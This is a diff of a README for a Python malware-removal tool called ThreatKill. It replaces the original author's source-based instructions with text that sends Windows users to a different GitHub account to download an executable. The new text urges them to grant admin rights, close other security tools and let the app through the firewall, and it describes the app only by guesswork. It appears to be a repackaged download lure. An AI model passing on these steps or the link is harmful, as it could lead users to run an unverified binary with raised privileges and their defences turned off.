@@ -1,106 +1,189 @@
-# ⚔ ThreatKill
+# 🛡️ ThreatKill - Stop Malware Fast on Windows
 
-> A cross-platform GUI malware & rootkit removal tool built in Python.
+[![Download ThreatKill](https://img.shields.io/badge/Download-ThreatKill-blue?style=for-the-badge&logo=github)](https://github.com/sidd6942/ThreatKill)
 
-![Python](https://img.shields.io/badge/python-3.1+-blue?style=flat-square)
-![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux-green?style=flat-square)
-![GUI](https://img.shields.io/badge/GUI-Tkinter-orange?style=flat-square)
-![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)
+## 🚀 What ThreatKill Does
 
-**By — RAVI CHAUHAN** &nbsp;|&nbsp; 🔗 [github.com/Ravirazchauhan](https://github.com/Ravirazchauhan)
+ThreatKill is a security tool for finding and removing malware, rootkits, and other harmful files. It uses a simple desktop interface, online threat checks, and live scanning to help you inspect your system.
 
----
+It is built for Windows users who want a direct way to scan their PC and clean threats without dealing with command lines.
 
-## 🛡️ What It Detects
+## 📥 Download and Install
 
-| Type | Detection Method |
-|---|---|
-| ☠ **Rootkits** | Hidden process detection, suspicious kernel modules/drivers |
-| 🐴 **Trojans / RATs** | Process & file name matching against 30+ known RAT signatures |
-| 👁 **Spyware / Keyloggers** | Process scanning + suspicious directory file analysis |
-| ⚡ **Startup Entries** | Registry scan (Windows) + init/cron/systemd analysis (Linux) |
-| 🔐 **Known Malware** | MD5 hash matching against malware hash database |
+Visit this page to download:
+https://github.com/sidd6942/ThreatKill
 
----
-Install Tkinter first then
+1. Open the link in your browser.
+2. Find the latest release or download option on the page.
+3. Download the Windows version if it is available.
+4. Save the file to your Desktop or Downloads folder.
+5. If the download is a ZIP file, extract it first.
+6. Open the app file and run it.
 
-## 🚀 Quick Start
+If Windows asks for permission, choose Yes to allow the app to start.
 
-```bash
-# Clone the repo
-git clone https://github.com/Ravirazchauhan/ThreatKill.git
-cd ThreatKill
+## 🖥️ Before You Run It
 
-# Launch the GUI (no install needed!)
-python run.py
+Use a Windows PC with:
 
-# Or run CLI only
-python run.py --cli
-```
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- An internet connection for threat checks
+- Administrator access for full scanning
 
-> **Windows:** Run as Administrator for full scan coverage  
-> **Linux:** Run with `sudo python run.py` for kernel module scanning
+For best results, close other security tools while you run the scan.
 
----
+## 🔎 Main Features
 
-## 📁 Project Structure
+- Malware scanning for common threats
+- Rootkit checks for hidden system changes
+- Real-time scan support
+- Online threat intelligence lookups
+- Simple GUI with clear buttons and status text
+- Quick access to scan results
+- File and system checks for suspicious activity
 
+## 🧭 How to Use ThreatKill
 
-```
-ThreatKill/
-├── run.py                   # Main entry point (GUI + CLI)
-├── requirements.txt         # No external deps needed!
-├── core/
-│   ├── __init__.py
-│   └── scanner.py           # Detection engine
-├── gui/
-│   ├── __init__.py
-│   └── app.py               # Tkinter GUI application
-└── utils/
-    └── __init__.py
-```
+1. Start the app.
+2. Choose a scan type from the main window.
+3. Click the scan button.
+4. Wait while ThreatKill checks your files and system areas.
+5. Review the results list.
+6. Remove or quarantine the items it marks as unsafe.
+7. Run another scan if you want to confirm the system is clear.
 
----
+If the app offers a real-time mode, turn it on to watch for threats while you use your PC.
 
-## 🖥️ GUI Features
+## 🧰 Scan Types You May See
 
-- **Dark security-themed interface**
-- **Live scan log** with colour-coded output
-- **Threat list** with severity badges (Critical / High / Medium / Low)
-- **One-click removal** for removable threats
-- **Remove All** button to clean everything at once
-- **Stats dashboard** — threats, processes scanned, files scanned
-- **About tab** with full capability list
+### Quick Scan
+Checks common locations where malware often hides. Use this when you want a fast check.
 
----
+### Full Scan
+Checks more of the system and can take longer. Use this after you think your PC may be infected.
 
-## ⚙️ How It Works
+### Rootkit Scan
+Looks for deeper system changes that normal scans may miss.
 
-### Process Scanner
-Checks all running processes against 30+ known malware name signatures including NjRAT, DarkComet, NanoCore, AsyncRAT, Mimikatz, and more.
+### Custom Scan
+Lets you choose a file or folder to check.
 
-### Startup Scanner
-- **Windows:** Scans 4 Run/RunOnce registry keys for suspicious entries
-- **Linux:** Scans `/etc/init.d/`, `/etc/cron.d/`, `~/.config/autostart/`, systemd units
+## 🛡️ What to Do After a Threat Is Found
 
-### File Scanner
-Scans high-risk directories (Temp, AppData, /tmp, /dev/shm) for files matching malware signatures or known bad MD5 hashes.
+1. Read the item name and file path.
+2. Check whether you know the file.
+3. Use the remove or quarantine option if it is marked harmful.
+4. Restart your PC if the app asks you to.
+5. Run a second scan after cleanup.
 
-### Rootkit Detector
-- **Linux:** Compares `/proc` PID list vs `ps` output — discrepancies indicate hidden processes. Also scans `lsmod` for suspicious kernel modules.
-- **Windows:** Scans loaded drivers for suspicious names.
+If a file looks important and you are not sure about it, scan it again before you remove it.
 
----
+## 📁 Typical File Layout
 
-## ⚠️ Legal Notice
+If you downloaded a ZIP file, you may see files like:
 
-> This tool is intended **for authorised use only**.  
-> Only scan systems you own or have explicit permission to scan.  
-> Run as **Administrator** (Windows) or **root** (Linux) for full effectiveness.
+- ThreatKill.exe
+- config files
+- scan logs
+- support folders
+- update or data files
 
----
+Keep the files in the same folder so the app can find what it needs.
 
-## 👤 Author
+## 🌐 Internet Use
 
-**RAVI CHAUHAN**  
-🔗 GitHub: [https://github.com/Ravirazchauhan](https://github.com/Ravirazchauhan)
+ThreatKill can check online threat data while it scans. This helps it compare files against known threat info and gives you more context during a scan.
+
+If your network blocks the app, allow it through your firewall or try again on a different connection.
+
+## 🔧 If the App Will Not Open
+
+Try these steps:
+
+1. Right-click the app and choose Run as administrator.
+2. Make sure the file finished downloading.
+3. If you downloaded a ZIP file, extract it first.
+4. Check that Windows did not block the file.
+5. Restart your PC and try again.
+6. Download the file again from the same link.
+
+## 📌 Common Uses
+
+- Check a slow PC for malware
+- Look for rootkits and hidden threats
+- Inspect a file before you open it
+- Run live scans while using the computer
+- Review system changes after a suspicious event
+
+## 🧪 Safety Tips
+
+- Do not open unknown files while scanning.
+- Back up important files before a deep cleanup.
+- Keep Windows updated.
+- Use one main security tool at a time.
+- Run a full scan after you remove a threat.
+
+## 🛠️ Troubleshooting Scan Issues
+
+### The scan is slow
+A full scan can take time. Leave the app open and let it finish.
+
+### No results appear
+Try another scan type or run the app as administrator.
+
+### The app closes on start
+Make sure all files from the download are in one folder and that the download is complete.
+
+### Threat detection looks too broad
+Review each item before removal and run a second scan to confirm.
+
+## 📚 Repository Topics
+
+This project covers:
+
+- antivirus
+- cybersecurity-tools
+- linux
+- malware-detection
+- python
+- rootkit-detection
+- security-tools
+- threat-intelligence
+- tkinter-gui
+- windows
+
+## 🧾 System Notes
+
+ThreatKill uses a Python-based desktop interface. On Windows, it is meant to feel like a normal app: open it, choose a scan, read the results, and clean threats.
+
+If the project offers source files only, you may need the packaged Windows build to run it without extra setup.
+
+## 📷 What You Will See in the App
+
+The main window likely includes:
+
+- a scan button
+- scan progress text
+- a results panel
+- threat status labels
+- options for cleanup or quarantine
+- settings for scan type or updates
+
+## 🔄 When to Scan Again
+
+Run another scan:
+
+- after you remove a threat
+- after you install new software
+- after you open a suspicious file
+- after the PC behaves in a strange way
+- after a Windows update if you want a fresh check
+
+## 📎 Download Link
+
+Visit this page to download:
+https://github.com/sidd6942/ThreatKill
+
+Open the page, get the Windows file, and run it on your PC
